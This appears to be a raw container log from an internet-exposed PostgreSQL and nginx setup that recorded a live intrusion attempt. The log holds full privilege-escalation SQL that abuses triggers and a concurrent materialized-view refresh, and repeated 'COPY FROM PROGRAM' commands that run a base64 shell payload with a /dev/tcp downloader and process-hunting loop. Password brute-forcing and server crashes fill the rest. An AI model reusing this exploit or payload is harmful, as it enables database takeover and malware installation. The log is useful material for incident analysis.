nginx-1  | 176.65.139.66 - - [21/Jun/2026:08:27:00 +0000] "GET / HTTP/1.0" 302 0 "-" "Shodan-Pull/1.0"
db-1     |          $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
db-1     |      CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
db-1     |          $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
db-1     |      CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;
db-1     |
db-1     |      CREATE FUNCTION swap() RETURNS INTEGER AS $$
db-1     |      DECLARE
db-1     |          target TEXT := get_target();
db-1     |      BEGIN
db-1     |          IF to_regclass(target) IS NOT NULL THEN
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
db-1     |          END IF;
db-1     |          RETURN 1;
db-1     |      END
db-1     |      $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
db-1     |      CREATE UNIQUE INDEX ix_mv_i ON mv (i);
db-1     |
db-1     |      CONNECT rdb postgres;
db-1     |      REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
db-1     | 2026-06-20 20:14:26.497 UTC [997] ERROR:  syntax error at or near "CONNECT" at character 54
db-1     | 2026-06-20 20:14:26.497 UTC [997] STATEMENT:  CREATE ROLE r0 LOGIN ;
db-1     |      CREATE DATABASE rdb OWNER r0;
db-1     |      CONNECT rdb r0;
db-1     |
db-1     |      CREATE FUNCTION pwn() RETURNS trigger AS $$
db-1     |      BEGIN
db-1     |          IF current_setting('is_superuser') THEN
db-1     |              RAISE WARNING '-- user % --', current_user;
db-1     |              ALTER USER r0 SUPERUSER;
db-1     |          END IF;
db-1     |          DROP VIEW IF EXISTS remove_later;
db-1     |          RETURN NEW;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE TABLE t1(i INTEGER);
db-1     |      CREATE CONSTRAINT TRIGGER trig
db-1     |          AFTER INSERT ON t1
db-1     |          INITIALLY DEFERRED
db-1     |          FOR EACH ROW EXECUTE PROCEDURE pwn();
db-1     |
db-1     |      CREATE FUNCTION get_target() RETURNS TEXT AS $$
db-1     |          SELECT format('%I.%I',
db-1     |            pg_my_temp_schema()::regnamespace,
db-1     |            'pg_temp_' || 'mv'::text::regclass::oid
db-1     |          );
db-1     |      $$ LANGUAGE SQL STABLE ;
db-1     |
db-1     |      CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
db-1     |      DECLARE
db-1     |          target TEXT := get_target();
db-1     |      BEGIN
db-1     |          IF to_regclass(target) IS NOT NULL THEN
db-1     |              EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
db-1     |              EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
db-1     |          END IF;
db-1     |          RETURN;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE FUNCTION attack() RETURNS INTEGER AS $$
db-1     |      DECLARE
db-1     |        target TEXT := get_target();
db-1     |      BEGIN
db-1     |          BEGIN
db-1     |              INSERT INTO t1 VALUES (1);
db-1     |              EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
db-1     |              EXECUTE format('CREATE TEMP TABLE %s()', target);
db-1     |          EXCEPTION WHEN OTHERS THEN -- do nothing
db-1     |          END;
db-1     |          RETURN 2;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
db-1     |      CREATE UNIQUE INDEX ix_mv_i ON mv (i);
db-1     |
db-1     |      CONNECT rdb postgres;
db-1     |      REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
db-1     | 2026-06-20 20:14:27.562 UTC [1] LOG:  server process (PID 997) was terminated by signal 9: Killed
db-1     | 2026-06-20 20:14:27.562 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 20:14:27.563 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 20:14:27.566 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 20:14:27.615 UTC [1004] LOG:  database system was interrupted; last known up at 2026-06-20 19:52:08 UTC
db-1     | 2026-06-20 20:14:27.692 UTC [1004] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 20:14:27.697 UTC [1004] LOG:  redo starts at 0/1BC20C0
db-1     | 2026-06-20 20:14:27.698 UTC [1004] LOG:  invalid record length at 0/1BC2E58: expected at least 24, got 0
db-1     | 2026-06-20 20:14:27.698 UTC [1004] LOG:  redo done at 0/1BC2E20 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 20:14:27.705 UTC [1005] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 20:14:27.741 UTC [1005] LOG:  checkpoint complete: wrote 4 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.012 s, sync=0.012 s, total=0.040 s; sync files=3, longest=0.006 s, average=0.004 s; distance=3 kB, estimate=3 kB; lsn=0/1BC2E58, redo lsn=0/1BC2E58
db-1     | 2026-06-20 20:14:27.748 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 20:14:47.845 UTC [1010] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:14:47.845 UTC [1010] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:16:19.858 UTC [1011] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:16:19.858 UTC [1011] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:17:52.160 UTC [1012] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:17:52.160 UTC [1012] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:19:24.339 UTC [1013] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:19:24.339 UTC [1013] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:20:27.122 UTC [1014] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:20:27.122 UTC [1014] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:20:36.210 UTC [1015] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:20:36.210 UTC [1015] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:20:57.365 UTC [1016] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:20:57.365 UTC [1016] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:22:29.841 UTC [1017] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:22:29.841 UTC [1017] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:24:02.179 UTC [1018] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:24:02.179 UTC [1018] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:25:34.788 UTC [1020] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:25:34.788 UTC [1020] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:25:37.073 UTC [1019] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 20:25:37.073 UTC [1019] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:25:53.072 UTC [1021] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 20:25:53.072 UTC [1021] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:26:20.611 UTC [1] LOG:  server process (PID 1022) was terminated by signal 9: Killed
db-1     | 2026-06-20 20:26:20.611 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 20:26:20.612 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 20:26:20.615 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 20:26:20.656 UTC [1024] LOG:  database system was interrupted; last known up at 2026-06-20 20:14:27 UTC
db-1     | 2026-06-20 20:26:20.746 UTC [1024] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 20:26:20.751 UTC [1024] LOG:  redo starts at 0/1BC2ED0
db-1     | 2026-06-20 20:26:20.752 UTC [1024] LOG:  invalid record length at 0/1BC2F08: expected at least 24, got 0
db-1     | 2026-06-20 20:26:20.752 UTC [1024] LOG:  redo done at 0/1BC2ED0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 20:26:20.764 UTC [1025] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 20:26:20.799 UTC [1025] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.007 s, sync=0.008 s, total=0.039 s; sync files=2, longest=0.007 s, average=0.004 s; distance=0 kB, estimate=0 kB; lsn=0/1BC2F08, redo lsn=0/1BC2F08
db-1     | 2026-06-20 20:26:20.810 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 20:27:06.575 UTC [1031] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:27:06.575 UTC [1031] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:27:06.873 UTC [1030] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:27:06.873 UTC [1030] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:27:09.187 UTC [1032] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:27:09.187 UTC [1032] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:27:37.164 UTC [1033] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:27:37.164 UTC [1033] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:27:39.905 UTC [1034] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:27:39.905 UTC [1034] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:28:39.012 UTC [1036] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:28:39.012 UTC [1036] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:30:11.438 UTC [1037] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:30:11.438 UTC [1037] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:31:43.449 UTC [1038] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:31:43.449 UTC [1038] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:33:16.251 UTC [1039] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:33:16.251 UTC [1039] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:33:21.958 UTC [1040] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 20:33:21.958 UTC [1040] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:33:33.748 UTC [1041] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 20:33:33.748 UTC [1041] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:33:57.461 UTC [1] LOG:  server process (PID 1042) was terminated by signal 9: Killed
db-1     | 2026-06-20 20:33:57.461 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 20:33:57.461 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 20:33:57.464 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 20:33:57.493 UTC [1044] LOG:  database system was interrupted; last known up at 2026-06-20 20:26:20 UTC
db-1     | 2026-06-20 20:33:57.570 UTC [1044] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 20:33:57.577 UTC [1044] LOG:  redo starts at 0/1BC2F80
db-1     | 2026-06-20 20:33:57.579 UTC [1044] LOG:  invalid magic number 0000 in WAL segment 000000010000000000000001, LSN 0/1BD8000, offset 12419072
db-1     | 2026-06-20 20:33:57.580 UTC [1044] LOG:  redo done at 0/1BD4E10 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 20:33:57.590 UTC [1045] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 20:33:57.615 UTC [1045] LOG:  checkpoint complete: wrote 17 buffers (0.1%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.005 s, sync=0.009 s, total=0.030 s; sync files=15, longest=0.005 s, average=0.001 s; distance=84 kB, estimate=84 kB; lsn=0/1BD8048, redo lsn=0/1BD8048
db-1     | 2026-06-20 20:33:57.622 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 20:34:47.795 UTC [1050] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:34:47.795 UTC [1050] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:36:20.532 UTC [1051] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:36:20.532 UTC [1051] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:37:52.915 UTC [1052] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:37:52.915 UTC [1052] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:39:24.792 UTC [1053] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:39:24.792 UTC [1053] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:40:26.988 UTC [1054] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 20:40:26.988 UTC [1054] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:40:43.140 UTC [1055] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 20:40:43.140 UTC [1055] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:40:57.177 UTC [1057] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:40:57.177 UTC [1057] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:41:02.081 UTC [1] LOG:  server process (PID 1056) was terminated by signal 9: Killed
db-1     | 2026-06-20 20:41:02.081 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 20:41:02.081 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 20:41:02.083 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 20:41:02.120 UTC [1060] LOG:  database system was interrupted; last known up at 2026-06-20 20:33:57 UTC
db-1     | 2026-06-20 20:41:02.189 UTC [1060] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 20:41:02.196 UTC [1060] LOG:  redo starts at 0/1BD80C0
db-1     | 2026-06-20 20:41:02.197 UTC [1060] LOG:  invalid record length at 0/1BD80F8: expected at least 24, got 0
db-1     | 2026-06-20 20:41:02.197 UTC [1060] LOG:  redo done at 0/1BD80C0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 20:41:02.205 UTC [1061] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 20:41:02.227 UTC [1061] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.007 s, sync=0.004 s, total=0.026 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1BD80F8, redo lsn=0/1BD80F8
db-1     | 2026-06-20 20:41:02.234 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 20:42:29.420 UTC [1066] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:42:29.420 UTC [1066] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:44:01.479 UTC [1067] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:44:01.479 UTC [1067] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:45:34.370 UTC [1068] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:45:34.370 UTC [1068] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:47:05.843 UTC [1069] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:47:05.843 UTC [1069] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:48:37.945 UTC [1070] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 20:48:37.945 UTC [1070] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:48:46.761 UTC [1071] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 20:48:46.761 UTC [1071] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 20:48:47.944 UTC [1072] FATAL:  password authentication failed for user "postgres"
